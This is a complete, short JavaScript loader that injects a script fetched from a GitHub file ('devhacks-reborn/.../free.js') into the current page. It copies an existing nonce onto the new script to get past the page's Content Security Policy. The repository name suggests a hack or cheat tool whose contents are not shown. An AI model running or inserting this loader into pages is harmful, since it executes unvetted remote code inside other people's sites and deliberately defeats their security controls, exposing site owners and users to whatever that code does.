const loader = document.createElement("script");
    loader.src = "https://raw.githubusercontent.com/Rupicc/devhacks-reborn/main/js/free.js";
    if (document.querySelector("[nonce]")) {
        loader.nonce = document.querySelector("[nonce]").nonce;
    }
document.body.appendChild(loader);